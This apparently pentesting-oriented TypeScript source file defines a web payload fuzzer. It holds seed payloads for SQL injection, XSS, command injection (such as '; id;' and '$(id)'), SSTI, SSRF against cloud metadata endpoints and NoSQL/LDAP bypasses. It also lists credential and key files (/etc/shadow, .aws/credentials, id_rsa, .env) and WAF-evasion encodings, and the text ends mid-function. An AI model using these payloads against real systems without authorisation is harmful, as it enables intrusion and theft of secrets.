/**
 * Payload Fuzzer Engine
 * Comprehensive security mutation & fuzzing engine for manual and semi-automated web application penetration testing.
 * Covers SQLi, XSS, Path Traversal / LFI, OS Command Injection, SSTI, SSRF, and NoSQL/LDAP.
 * Features dedicated URL Parameter Fuzzing with automated URL encoding & directory traversal bypasses.
 */

export type FuzzCategory = 
  | 'SQLI' 
  | 'XSS' 
  | 'PATH_TRAVERSAL' 
  | 'COMMAND_INJECTION' 
  | 'SSTI' 
  | 'SSRF' 
  | 'NOSQL_LDAP';

export type PlacementMode = 'MARKER' | 'SUFFIX' | 'PREFIX' | 'REPLACE' | 'QUOTE_WRAP';

export type MutationType = 
  | 'raw'
  | 'url_encode'
  | 'double_url_encode'
  | 'all_char_url'
  | 'traversal_dot_slash_url'     // ../ -> %2e%2e%2f
  | 'traversal_slash_only_url'    // ../ -> ..%2f
  | 'traversal_dot_only_url'      // ../ -> %2e%2e/
  | 'traversal_double_encoded'    // ../ -> %252e%252e%252f
  | 'traversal_non_recursive'     // ../ -> ....//
  | 'traversal_utf8_overlong'     // ../ -> %c0%ae%c0%ae%c0%af
  | 'traversal_16bit_unicode'     // ../ -> %u002e%u002e%u002f
  | 'traversal_windows_backslash' // ..\ -> ..%5c or %2e%2e%5c
  | 'case_alternate'
  | 'whitespace_tamper'
  | 'null_byte'
  | 'quote_tamper'
  | 'unicode_homoglyph'
  | 'html_entity';

export interface FuzzSeed {
  id: string;
  category: FuzzCategory;
  name: string;
  payload: string;
  description: string;
  targetContext: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
}

export interface MutationOption {
  id: MutationType;
  name: string;
  description: string;
  enabled: boolean;
  badge: string;
}

export interface GeneratedFuzzItem {
  id: string;
  category: FuzzCategory;
  categoryLabel: string;
  techniqueName: string;
  originalSeed: string;
  mutationType: MutationType;
  mutationLabel: string;
  fuzzedString: string;
  length: number;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  description: string;
  parameterName?: string;
  rawPayloadOnly?: string;
  encodingApplied?: string;
}

export interface ParsedUrlParam {
  name: string;
  value: string;
}

export interface ParsedUrlDetails {
  rawUrl: string;
  protocol: string;
  host: string;
  pathname: string;
  params: ParsedUrlParam[];
  hash: string;
  isValidUrl: boolean;
}

export interface DirectoryTraversalOption {
  id: string;
  name: string;
  pattern: string; // e.g., '%2e%2e%2f'
  description: string;
  badge: string;
  category: 'standard' | 'encoded' | 'waf_bypass' | 'unicode';
}

export interface CommonTargetFile {
  id: string;
  name: string;
  path: string;
  os: 'Linux' | 'Windows' | 'Cloud/App' | 'Wrapper';
  description: string;
  severity: 'CRITICAL' | 'HIGH';
}

export const FUZZ_CATEGORIES: Array<{
  id: FuzzCategory;
  name: string;
  shortLabel: string;
  color: string;
  badgeClass: string;
  description: string;
}> = [
  {
    id: 'SQLI',
    name: 'SQL Injection (SQLi)',
    shortLabel: 'SQLi',
    color: '#ef4444',
    badgeClass: 'bg-red-500/20 text-red-300 border-red-500/30',
    description: 'Auth bypass, UNION SELECT, time-based blind (pg_sleep/SLEEP), stacked queries e comentários de evasão.'
  },
  {
    id: 'XSS',
    name: 'Cross-Site Scripting (XSS)',
    shortLabel: 'XSS',
    color: '#eab308',
    badgeClass: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/30',
    description: 'DOM/Reflected XSS, eventos inline (onload, onerror), SVG polyglots, template literals e bypass de filtros.'
  },
  {
    id: 'PATH_TRAVERSAL',
    name: 'Path Traversal / LFI',
    shortLabel: 'Traversal',
    color: '#f97316',
    badgeClass: 'bg-orange-500/20 text-orange-300 border-orange-500/30',
    description: 'Dot-dot-slash (../), backslashes (..\\), encodings aninhados, null bytes e caminhos sensíveis do SO.'
  },
  {
    id: 'COMMAND_INJECTION',
    name: 'OS Command Injection (RCE)',
    shortLabel: 'CMDi',
    color: '#dc2626',
    badgeClass: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
    description: 'Operadores de encadeamento (; | || && &), subshells $(), crases, expansão de variáveis e quebras de linha.'
  },
  {
    id: 'SSTI',
    name: 'Server-Side Template Injection',
    shortLabel: 'SSTI',
    color: '#a855f7',
    badgeClass: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
    description: 'Expressões matemáticas e injeção de templates Jinja2, Twig, Freemarker, Spring SpEL e ERB.'
  },
  {
    id: 'SSRF',
    name: 'Server-Side Request Forgery',
    shortLabel: 'SSRF',
    color: '#06b6d4',
    badgeClass: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    description: 'Evasões de IP de metadados de nuvem (169.254.169.254), notação decimal, octal, IPv6 e loopback localhost.'
  },
  {
    id: 'NOSQL_LDAP',
    name: 'NoSQL & LDAP Injection',
    shortLabel: 'NoSQL/LDAP',
    color: '#3b82f6',
    badgeClass: 'bg-blue-500/20 text-blue-300 border-blue-500/30',
    description: 'Operadores NoSQL MongoDB ($ne, $gt, $regex) e caracteres de escape de filtros LDAP (*, )(cn=*)).'
  }
];

export const DEFAULT_FUZZ_SEEDS: FuzzSeed[] = [
  // --- SQLi ---
  {
    id: 'sqli-1',
    category: 'SQLI',
    name: 'Generic Auth Bypass OR 1=1',
    payload: "' OR '1'='1",
    description: 'Clássico escape de aspas simples com condição booleana tautológica verdadeira.',
    targetContext: 'Auth Login / Search Input',
    severity: 'CRITICAL'
  },
  {
    id: 'sqli-2',
    category: 'SQLI',
    name: 'Numeric Auth Bypass OR 1=1--',
    payload: '1 OR 1=1--',
    description: 'Bypass para campos numéricos com comentário delimitador SQL padrão.',
    targetContext: 'Numeric ID query parameter',
    severity: 'CRITICAL'
  },
  {
    id: 'sqli-3',
    category: 'SQLI',
    name: 'MySQL Comment Delimiter #',
    payload: "' OR 1=1#",
    description: 'Escape de aspas com caractere de comentário estilo hash para MySQL e MariaDB.',
    targetContext: 'MySQL form input',
    severity: 'HIGH'
  },
  {
    id: 'sqli-4',
    category: 'SQLI',
    name: 'UNION SELECT Column Enumeration',
    payload: "' UNION SELECT null,null,null--",
    description: 'Injeção UNION com colunas nulas para descobrir largura do conjunto de resultados.',
    targetContext: 'Result listing endpoint',
    severity: 'HIGH'
  },
  {
    id: 'sqli-5',
    category: 'SQLI',
    name: 'Time-Based Blind MySQL (SLEEP)',
    payload: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    description: 'Verificação de execução cega com atraso forçado de 5 segundos no MySQL.',
    targetContext: 'Blind parameter without feedback',
    severity: 'HIGH'
  },
  {
    id: 'sqli-6',
    category: 'SQLI',
    name: 'Time-Based Blind PostgreSQL (pg_sleep)',
    payload: "1'; SELECT pg_sleep(5)--",
    description: 'Injeção de consulta em pilha com função pg_sleep no PostgreSQL.',
    targetContext: 'Stacked query parameter',
    severity: 'HIGH'
  },
  {
    id: 'sqli-7',
    category: 'SQLI',
    name: 'Order By Null Sorting Probe',
    payload: "1' ORDER BY 10--",
    description: 'Detecção de número máximo de colunas ordenáveis via cláusula ORDER BY.',
    targetContext: 'Sort / Order parameter',
    severity: 'MEDIUM'
  },

  // --- XSS ---
  {
    id: 'xss-1',
    category: 'XSS',
    name: 'Classic Script Alert Tag',
    payload: '<script>alert(document.domain)</script>',
    description: 'Injeção clássica de tag script com extração do domínio de execução.',
    targetContext: 'HTML Body context',
    severity: 'HIGH'
  },
  {
    id: 'xss-2',
    category: 'XSS',
    name: 'Image OnError Fallback',
    payload: '<img src=x onerror=alert(1)>',
    description: 'Tag de imagem com URL inválida disparando o manipulador de erro JavaScript inline.',
    targetContext: 'Attribute / Tag filter bypass',
    severity: 'HIGH'
  },
  {
    id: 'xss-3',
    category: 'XSS',
    name: 'SVG OnLoad Vector',
    payload: '<svg onload=alert(1)>',
    description: 'Vetor moderno baseado em SVG e evento onload, frequentemente aceito em sanitizers fracos.',
    targetContext: 'Rich text or SVG upload',
    severity: 'HIGH'
  },
  {
    id: 'xss-4',
    category: 'XSS',
    name: 'Attribute Breakout (Double Quote)',
    payload: '" onfocus="alert(1)" autofocus="',
    description: 'Escape de atributo de tag HTML (ex: input value="") com gatilho automático via autofocus.',
    targetContext: 'Input value="[FUZZ]"',
    severity: 'HIGH'
  },
  {
    id: 'xss-5',
    category: 'XSS',
    name: 'JavaScript URI Pseudo-Protocol',
    payload: 'javascript:alert(1)',
    description: 'Execução via atributo href ou src em links e redirecionamentos controlados pelo usuário.',
    targetContext: '<a href="[FUZZ]">',
    severity: 'MEDIUM'
  },
  {
    id: 'xss-6',
    category: 'XSS',
    name: 'Template Literal Execution',
    payload: '`${alert(1)}`',
    description: 'Injeção dentro de template strings do JavaScript no frontend.',
    targetContext: 'Script block variable interpolation',
    severity: 'HIGH'
  },

  // --- Path Traversal / LFI ---
  {
    id: 'lfi-1',
    category: 'PATH_TRAVERSAL',
    name: 'Standard Relative Traversal 6-Deep',
    payload: '../../../../../../etc/passwd',
    description: 'Recursão de 6 níveis para leitura do arquivo de contas de usuários em sistemas Linux.',
    targetContext: 'File download / View route',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-2',
    category: 'PATH_TRAVERSAL',
    name: 'Windows System File Win.ini',
    payload: '..\\..\\..\\..\\..\\..\\windows\\win.ini',
    description: 'Travessia de diretório com barras invertidas visando sistema operacional Windows.',
    targetContext: 'File path on Windows hosts',
    severity: 'HIGH'
  },
  {
    id: 'lfi-3',
    category: 'PATH_TRAVERSAL',
    name: 'Nested Bypass Sequence (..././)',
    payload: '....//....//....//....//etc/passwd',
    description: 'Evasão de filtros simples que removem apenas "../" sem recursão profunda.',
    targetContext: 'Sanitized path string',
    severity: 'HIGH'
  },
  {
    id: 'lfi-4',
    category: 'PATH_TRAVERSAL',
    name: 'PHP Filter Base64 Resource Read',
    payload: 'php://filter/convert.base64-encode/resource=index.php',
    description: 'Wrapper nativo do PHP para exfiltração do código fonte sem execução.',
    targetContext: 'PHP include / require endpoints',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-5',
    category: 'PATH_TRAVERSAL',
    name: 'Linux Process Environment Probe',
    payload: '../../../../../../proc/self/environ',
    description: 'Acesso a variáveis de ambiente e segredos de processo no Linux.',
    targetContext: 'Linux OS file reading',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-6',
    category: 'PATH_TRAVERSAL',
    name: 'Linux Shadow Passwords File',
    payload: '../../../../../../etc/shadow',
    description: 'Tentativa de extração de hashes de senhas dos usuários locais no Linux.',
    targetContext: 'Privileged file read endpoints',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-7',
    category: 'PATH_TRAVERSAL',
    name: 'Null-Byte Extension Bypass (%00.png)',
    payload: '../../../../../../etc/passwd%00.png',
    description: 'Bypass de validação de sufixo ou extensão fixa com caractere nulo.',
    targetContext: 'File preview endpoints with static extension',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-8',
    category: 'PATH_TRAVERSAL',
    name: 'Pre-Encoded Slash Traversal (..%2f)',
    payload: '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    description: 'Codificação de barras (/ -> %2f) para evasão de regex de caminho.',
    targetContext: 'URL query parameter file loader',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-9',
    category: 'PATH_TRAVERSAL',
    name: 'Full URL-Encoded Traversal (%2e%2e%2f)',
    payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    description: 'Codificação completa de pontos e barras para burlar detecções estáticas de WAF.',
    targetContext: 'WAF-protected file parameter',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-10',
    category: 'PATH_TRAVERSAL',
    name: 'Application Environment Secrets (.env)',
    payload: '../../../../../../.env',
    description: 'Extração direta de credenciais de aplicação web, tokens de API e conexões de banco de dados.',
    targetContext: 'Web application root directory',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-11',
    category: 'PATH_TRAVERSAL',
    name: 'AWS CLI Credentials Leak',
    payload: '../../../../../../root/.aws/credentials',
    description: 'Leitura de credenciais permanentes do AWS CLI no diretório do usuário root.',
    targetContext: 'Cloud-hosted EC2/container services',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-12',
    category: 'PATH_TRAVERSAL',
    name: 'Absolute Root Path Read',
    payload: '/etc/passwd',
    description: 'Caminho absoluto direto sem necessidade de recursão relativa.',
    targetContext: 'Direct path concatenation',
    severity: 'CRITICAL'
  },

  // --- OS Command Injection ---
  {
    id: 'cmd-1',
    category: 'COMMAND_INJECTION',
    name: 'Semicolon Command Chaining (id)',
    payload: '; id;',
    description: 'Separação de comandos no shell bash/sh com ponto e vírgula.',
    targetContext: 'System ping or tool runner',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-2',
    category: 'COMMAND_INJECTION',
    name: 'Pipe Chaining Operator (| whoami)',
    payload: '| whoami',
    description: 'Redirecionamento de saída para execução arbitrária do comando whoami.',
    targetContext: 'CLI pipe inputs',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-3',
    category: 'COMMAND_INJECTION',
    name: 'Subshell Execution $(id)',
    payload: '$(id)',
    description: 'Injeção de subshell POSIX para execução assíncrona do binário id.',
    targetContext: 'Quoted command parameter',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-4',
    category: 'COMMAND_INJECTION',
    name: 'Double Ampersand AND (&& id)',
    payload: '&& id',
    description: 'Execução condicional em caso de sucesso do comando anterior.',
    targetContext: 'Shell argument input',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-5',
    category: 'COMMAND_INJECTION',
    name: 'Backtick Shell Execution `whoami`',
    payload: '`whoami`',
    description: 'Execução inline clássica em Bourne Shell e shells compatíveis.',
    targetContext: 'String interpolation parameter',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-6',
    category: 'COMMAND_INJECTION',
    name: 'Newline Inject (%0a id)',
    payload: '\nid\n',
    description: 'Quebra de linha CRLF para iniciar novo comando em ambientes sem escape de quebras.',
    targetContext: 'Single line CLI script',
    severity: 'HIGH'
  },

  // --- SSTI ---
  {
    id: 'ssti-1',
    category: 'SSTI',
    name: 'Polyglot Mathematical Expression {{7*7}}',
    payload: '{{7*7}}',
    description: 'Expressão básica para detecção de avaliação dinâmica (renderiza 49 se vulnerável).',
    targetContext: 'Template engine placeholder',
    severity: 'HIGH'
  },
  {
    id: 'ssti-2',
    category: 'SSTI',
    name: 'Jinja2 / Flask Subclasses RCE Probe',
    payload: "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    description: 'Navegação pela hierarquia de classes em Python/Jinja2 para alcançar os.popen.',
    targetContext: 'Flask / Django Jinja2 template',
    severity: 'CRITICAL'
  },
  {
    id: 'ssti-3',
    category: 'SSTI',
    name: 'Spring Expression Language (SpEL)',
    payload: '${T(java.lang.Runtime).getRuntime().exec("id")}',
    description: 'Injeção de expressões SpEL em aplicações Java / Spring Boot.',
    targetContext: 'Spring Boot REST header or param',
    severity: 'CRITICAL'
  },
  {
    id: 'ssti-4',
    category: 'SSTI',
    name: 'Twig / Symfony Expression {{7*"7"}}',
    payload: '{{7*"7"}}',
    description: 'Avaliação matemática específica do Twig (PHP) para diferenciação de Jinja2.',
    targetContext: 'PHP Twig template parser',
    severity: 'HIGH'
  },

  // --- SSRF ---
  {
    id: 'ssrf-1',
    category: 'SSRF',
    name: 'AWS IMDSv1 Metadata IP',
    payload: 'http://169.254.169.254/latest/meta-data/',
    description: 'Acesso direto ao serviço de metadados da AWS para extração de credenciais de IAM Roles.',
    targetContext: 'Webhook URL / Image fetcher',
    severity: 'CRITICAL'
  },
  {
    id: 'ssrf-2',
    category: 'SSRF',
    name: 'Localhost IPv4 Loopback (127.0.0.1)',
    payload: 'http://127.0.0.1:8080/admin',
    description: 'Acesso a portas e serviços internos não expostos à internet pública.',
    targetContext: 'URL parameter fetch',
    severity: 'HIGH'
  },
  {
    id: 'ssrf-3',
    category: 'SSRF',
    name: 'Decimal DWORD IP (2130706433)',
    payload: 'http://2130706433:80/',
    description: 'Evasão de filtros de regex de IP convertendo 127.0.0.1 para representação numérica inteira.',
    targetContext: 'Regex-protected URL field',
    severity: 'HIGH'
  },
  {
    id: 'ssrf-4',
    category: 'SSRF',
    name: 'Hexadecimal IP (0x7f000001)',
    payload: 'http://0x7f000001/',
    description: 'Evasão de validação de hostname convertendo endereço de loopback para base hexadecimal.',
    targetContext: 'URL validation bypass',
    severity: 'HIGH'
  },
  {
    id: 'ssrf-5',
    category: 'SSRF',
    name: 'GCP Metadata with Required Header',
    payload: 'http://metadata.google.internal/computeMetadata/v1/',
    description: 'Endpoint de metadados do Google Cloud Platform para instâncias Compute Engine.',
    targetContext: 'GCP Cloud environment',
    severity: 'CRITICAL'
  },

  // --- NoSQL & LDAP ---
  {
    id: 'nosql-1',
    category: 'NOSQL_LDAP',
    name: 'MongoDB Not-Equal ($ne: null)',
    payload: '{"$ne": null}',
    description: 'Operador de comparação do MongoDB que avalia para verdadeiro em qualquer documento com o campo presente.',
    targetContext: 'JSON auth payload {"password": [FUZZ]}',
    severity: 'CRITICAL'
  },
  {
    id: 'nosql-2',
    category: 'NOSQL_LDAP',
    name: 'MongoDB Greater-Than Query ($gt: "")',
    payload: '{"$gt": ""}',
    description: 'Avalia qualquer string não vazia para autenticação sem conhecer a senha real.',
    targetContext: 'NoSQL credentials query',
    severity: 'CRITICAL'
  },
  {
    id: 'nosql-3',
    category: 'NOSQL_LDAP',
    name: 'LDAP Wildcard Filter Bypass (*)',
    payload: '*)(uid=*))(|(uid=*',
    description: 'Injeção de filtros LDAP para anular condições de busca e retornar todos os registros de diretório.',
    targetContext: 'Corporate LDAP login form',
    severity: 'HIGH'
  }
];

export const DEFAULT_MUTATION_OPTIONS: MutationOption[] = [
  {
    id: 'raw',
    name: 'Raw / Baseline',
    description: 'Mantém o payload original exato sem alterações.',
    enabled: true,
    badge: 'Original'
  },
  {
    id: 'url_encode',
    name: 'URL Encode (Single)',
    description: 'Converte caracteres especiais em %XX (espaço -> %20, aspas -> %27, barras -> %2F).',
    enabled: true,
    badge: '%20'
  },
  {
    id: 'double_url_encode',
    name: 'Double URL Encode',
    description: 'Codifica a porcentagem duas vezes (% -> %2520) para bypass de reverse proxies e CDNs.',
    enabled: true,
    badge: '%2520'
  },
  {
    id: 'all_char_url',
    name: 'Full Hex URL Encode',
    description: 'Converte 100% dos caracteres para percent-encoding hexadecimal (inclusive letras e números).',
    enabled: false,
    badge: '%41%42%43'
  },
  {
    id: 'traversal_dot_slash_url',
    name: 'Traversal Dot-Slash (%2e%2e%2f)',
    description: 'Codifica ../ para %2e%2e%2f e ..\\ para %2e%2e%5c (evasão clássica de inspeção de WAF).',
    enabled: true,
    badge: '%2e%2e%2f'
  },
  {
    id: 'traversal_slash_only_url',
    name: 'Traversal Slash-Only (..%2f)',
    description: 'Codifica apenas as barras (/ -> %2f e \\ -> %5c) mantendo pontos literais.',
    enabled: true,
    badge: '..%2f'
  },
  {
    id: 'traversal_dot_only_url',
    name: 'Traversal Dot-Only (%2e%2e/)',
    description: 'Codifica apenas os pontos (. -> %2e) mantendo barras literais.',
    enabled: false,
    badge: '%2e%2e/'
  },
  {
    id: 'traversal_double_encoded',
    name: 'Traversal Double URL (%252e%252e%252f)',
    description: 'Codificação dupla para servidores com múltiplos saltos de decodificação reversa.',
    enabled: true,
    badge: '%252e%252e%252f'
  },
  {
    id: 'traversal_non_recursive',
    name: 'Non-Recursive Strip (....//)',
    description: 'Evasão contra funções de sanitização que realizam replace("../", "") em passagem única.',
    enabled: true,
    badge: '....//'
  },
  {
    id: 'traversal_utf8_overlong',
    name: 'Overlong UTF-8 (%c0%ae%c0%ae%c0%af)',
    description: 'Bytes fora do padrão UTF-8 que decodificam para ../ em parsers legados.',
    enabled: false,
    badge: '%c0%ae...'
  },
  {
    id: 'traversal_16bit_unicode',
    name: '16-bit Unicode (%u002e%u002e%u002f)',
    description: 'Codificação Unicode de 16 bits para servidores IIS / ASP.NET.',
    enabled: false,
    badge: '%u002e...'
  },
  {
    id: 'traversal_windows_backslash',
    name: 'Windows Backslash (..\\ / ..%5c)',
    description: 'Converte barras normais para barras invertidas do Windows.',
    enabled: false,
    badge: '..%5c'
  },
  {
    id: 'case_alternate',
    name: 'Case Alternation (aLtErNaTe)',
    description: 'Alterna entre maiúsculas e minúsculas para burlar regras de regex sensíveis à caixa.',
    enabled: false,
    badge: 'sElEcT'
  },
  {
    id: 'whitespace_tamper',
    name: 'Whitespace Tamper (/**/)',
    description: 'Substitui espaços por comentários SQL inline (/**/) ou quebras de linha URL (%0a).',
    enabled: false,
    badge: '/**/ & %0a'
  },
  {
    id: 'null_byte',
    name: 'Null Byte Injection (%00)',
    description: 'Anexa %00 ou \\x00 para testar terminação antecipada de strings e bypass de extensão.',
    enabled: true,
    badge: '%00'
  },
  {
    id: 'quote_tamper',
    name: 'Quote & Bracket Wrap',
    description: 'Envolve e escapa o payload com aspas simples, duplas e parênteses para quebrar sintaxe.',
    enabled: false,
    badge: `'\'' / ")"`
  },
  {
    id: 'unicode_homoglyph',
    name: 'Unicode Fullwidth Homoglyphs',
    description: 'Converte caracteres como <, >, /, \\ para homóglifos de largura total (＜, ＞, ／).',
    enabled: false,
    badge: '＜script＞'
  },
  {
    id: 'html_entity',
    name: 'HTML Entity Encode',
    description: 'Converte caracteres em entidades decimais e hexadecimais (&lt;, &#x27;).',
    enabled: false,
    badge: '&#x27;'
  }
];

export const DIRECTORY_TRAVERSAL_ENCODINGS: DirectoryTraversalOption[] = [
  {
    id: 'raw',
    name: 'Raw Standard (../)',
    pattern: '../',
    description: 'Sequência canônica de subida de diretório em sistemas UNIX e navegadores.',
    badge: '../',
    category: 'standard'
  },
  {
    id: 'full_url',
    name: 'Full URL Encoded (%2e%2e%2f)',
    pattern: '%2e%2e%2f',
    description: 'Codificação completa dos pontos (. = %2e) e barra (/ = %2f) para evasão de inspeção estática.',
    badge: '%2e%2e%2f',
    category: 'encoded'
  },
  {
    id: 'slash_only',
    name: 'Slash Only Encoded (..%2f)',
    pattern: '..%2f',
    description: 'Codifica apenas a barra inclinada. Evasão comum contra filtros que barram "../" literal.',
    badge: '..%2f',
    category: 'encoded'
  },
  {
    id: 'dot_only',
    name: 'Dot Only Encoded (%2e%2e/)',
    pattern: '%2e%2e/',
    description: 'Codifica apenas os pontos (. = %2e) mantendo a barra visível para o roteador.',
    badge: '%2e%2e/',
    category: 'encoded'
  },
  {
    id: 'double_url',
    name: 'Double URL Encoded (%252e%252e%252f)',
    pattern: '%252e%252e%252f',
    description: 'Codificação dupla para servidores com múltiplos saltos de decodificação reversa.',
    badge: '%252e%252e%252f',
    category: 'waf_bypass'
  },
  {
    id: 'non_recursive',
    name: 'Non-Recursive Strip (....//)',
    pattern: '....//',
    description: 'Quando o filtro de segurança executa replace("../", "") uma única vez, resulta em "../" novamente.',
    badge: '....//',
    category: 'waf_bypass'
  },
  {
    id: 'nested_dot_slash',
    name: 'Nested Dot-Slash (..././)',
    pattern: '..././',
    description: 'Variante de evasão contra parsers com normalização rasa de caminhos.',
    badge: '..././',
    category: 'waf_bypass'
  },
  {
    id: 'windows_backslash',
    name: 'Windows Backslash (..\\)',
    pattern: '..\\',
    description: 'Separador nativo do sistema operacional Windows (DOS / NTFS).',
    badge: '..\\',
    category: 'standard'
  },
  {
    id: 'windows_backslash_url',
    name: 'Windows Backslash URL (..%5c)',
    pattern: '..%5c',
    description: 'Barra invertida do Windows codificada (%5c = \\) contra filtros de URL.',
    badge: '..%5c',
    category: 'encoded'
  },
  {
    id: 'windows_full_url',
    name: 'Windows Full URL (%2e%2e%5c)',
    pattern: '%2e%2e%5c',
    description: 'Pontos e barra invertida Windows totalmente codificados em URL.',
    badge: '%2e%2e%5c',
    category: 'encoded'
  },
  {
    id: 'utf8_overlong',
    name: 'Overlong UTF-8 (%c0%ae%c0%ae%c0%af)',
    pattern: '%c0%ae%c0%ae%c0%af',
    description: 'Bytes UTF-8 fora do padrão que decodificam para "../" em parsers vulneráveis do IIS / Apache antigo.',
    badge: '%c0%ae...',
    category: 'unicode'
  },
  {
    id: '16bit_unicode',
    name: '16-bit Unicode (%u002e%u002e%u002f)',
    pattern: '%u002e%u002e%u002f',
    description: 'Codificação Unicode de 16 bits aceita pelo Microsoft IIS e frameworks legadas.',
    badge: '%u002e...',
    category: 'unicode'
  }
];

export const COMMON_TARGET_FILES: CommonTargetFile[] = [
  {
    id: 'linux-passwd',
    name: 'Linux /etc/passwd',
    path: 'etc/passwd',
    os: 'Linux',
    description: 'Contas locais, shells e estrutura de usuários do sistema UNIX.',
    severity: 'CRITICAL'
  },
  {
    id: 'linux-shadow',
    name: 'Linux /etc/shadow',
    path: 'etc/shadow',
    os: 'Linux',
    description: 'Hashes de senhas do sistema Linux (exige privilégios elevados de leitura).',
    severity: 'CRITICAL'
  },
  {
    id: 'linux-environ',
    name: 'Linux /proc/self/environ',
    path: 'proc/self/environ',
    os: 'Linux',
    description: 'Variáveis de ambiente do processo atual, chaves de API, senhas e DB strings.',
    severity: 'CRITICAL'
  },
  {
    id: 'linux-cmdline',
    name: 'Linux /proc/self/cmdline',
    path: 'proc/self/cmdline',
    os: 'Linux',
    description: 'Argumentos e parâmetros passados na inicialização do serviço.',
    severity: 'HIGH'
  },
  {
    id: 'linux-hosts',
    name: 'Linux /etc/hosts',
    path: 'etc/hosts',
    os: 'Linux',
    description: 'Resoluções de host locais e infraestrutura interna.',
    severity: 'HIGH'
  },
  {
    id: 'linux-apache-log',
    name: 'Apache Log /var/log/apache2/access.log',
    path: 'var/log/apache2/access.log',
    os: 'Linux',
    description: 'Log de acessos do Apache (útil para LFI-to-RCE via log poisoning).',
    severity: 'CRITICAL'
  },
  {
    id: 'win-ini',
    name: 'Windows win.ini',
    path: 'windows/win.ini',
    os: 'Windows',
    description: 'Arquivo de inicialização clássico presente em instalações Windows.',
    severity: 'HIGH'
  },
  {
    id: 'win-hosts',
    name: 'Windows hosts file',
    path: 'windows/system32/drivers/etc/hosts',
    os: 'Windows',
    description: 'Mapeamento DNS local do Windows.',
    severity: 'HIGH'
  },
  {
    id: 'win-boot-ini',
    name: 'Windows boot.ini',
    path: 'boot.ini',
    os: 'Windows',
    description: 'Configuração de boot em servidores legados Windows.',
    severity: 'HIGH'
  },
  {
    id: 'app-env',
    name: 'App .env Environment Secrets',
    path: '.env',
    os: 'Cloud/App',
    description: 'Segredos da aplicação web, JWT_SECRET, AWS_KEY, DATABASE_URL.',
    severity: 'CRITICAL'
  },
  {
    id: 'aws-creds',
    name: 'AWS Credentials (~/.aws/credentials)',
    path: 'root/.aws/credentials',
    os: 'Cloud/App',
    description: 'Chaves de acesso permanente do AWS CLI da conta root ou de serviço.',
    severity: 'CRITICAL'
  },
  {
    id: 'ssh-key',
    name: 'SSH Private Key (id_rsa)',
    path: 'root/.ssh/id_rsa',
    os: 'Cloud/App',
    description: 'Chave RSA privada para conexão SSH ao servidor.',
    severity: 'CRITICAL'
  },
  {
    id: 'php-filter',
    name: 'PHP Filter Base64 Wrapper',
    path: 'php://filter/convert.base64-encode/resource=index.php',
    os: 'Wrapper',
    description: 'Exfiltração de código PHP codificado em Base64 sem executá-lo.',
    severity: 'CRITICAL'
  }
];

/**
 * Mutation Transform Functions
 */
export function applyMutation(payload: string, mutationType: MutationType): string {
  switch (mutationType) {
    case 'raw':
      return payload;

    case 'url_encode':
      return encodeURIComponent(payload);

    case 'double_url_encode':
      return encodeURIComponent(encodeURIComponent(payload));

    case 'all_char_url':
      return payload
        .split('')
        .map(char => '%' + char.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase())
        .join('');

    case 'traversal_dot_slash_url':
      return payload
        .replace(/\.\.\//g, '%2e%2e%2f')
        .replace(/\.\.\\/g, '%2e%2e%5c');

    case 'traversal_slash_only_url':
      return payload
        .replace(/\//g, '%2f')
        .replace(/\\/g, '%5c');

    case 'traversal_dot_only_url':
      return payload.replace(/\./g, '%2e');

    case 'traversal_double_encoded':
      return payload
        .replace(/\.\.\//g, '%252e%252e%252f')
        .replace(/\.\.\\/g, '%252e%252e%255c')
        .replace(/\//g, '%252f');

    case 'traversal_non_recursive':
      return payload
        .replace(/\.\.\//g, '....//')
        .replace(/\.\.\\/g, '....\\\\');

    case 'traversal_utf8_overlong':
      return payload
        .replace(/\.\.\//g, '%c0%ae%c0%ae%c0%af')
        .replace(/\//g, '%c0%af')
        .replace(/\\/g, '%c1%9c');

    case 'traversal_16bit_unicode':
      return payload
        .replace(/\.\.\//g, '%u002e%u002e%u002f')
        .replace(/\//g, '%u002f')
        .replace(/\\/g, '%u005c');

    case 'traversal_windows_backslash':
      return payload
        .replace(/\//g, '\\')
        .replace(/\.\.\//g, '..\\');

    case 'case_alternate':
      return payload
        .split('')
        .map((char, index) => (index % 2 === 0 ? char.toLowerCase() : char.toUpperCase()))
        .join('');

    case 'whitespace_tamper':
      if (payload.includes(' ')) {
        return payload.replace(/ /g, '/**/');
      }
      return payload + '/**/';

    case 'null_byte':
      return payload + '%00';

    case 'quote_tamper':
      return `') OR ('1'='1' -- ` + payload;

    case 'unicode_homoglyph':
      return payload
        .replace(/</g, '＜')
        .replace(/>/g, '＞')
        .replace(/\//g, '／')
        .replace(/\\/g, '＼')
        .replace(/'/g, '＇')
        .replace(/"/g, '＂');

    case 'html_entity':
      return payload
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');

    default:
      return payload;
  }
}

/**
 * URL Parameter Parsing and Reconstruction Helpers
 */
export function parseUrlParameters(urlString: string): ParsedUrlDetails {
  const trimmed = urlString.trim();
  if (!trimmed) {
    return {
      rawUrl: '',
      protocol: '',
      host: '',
      pathname: '',
      params: [],
      hash: '',
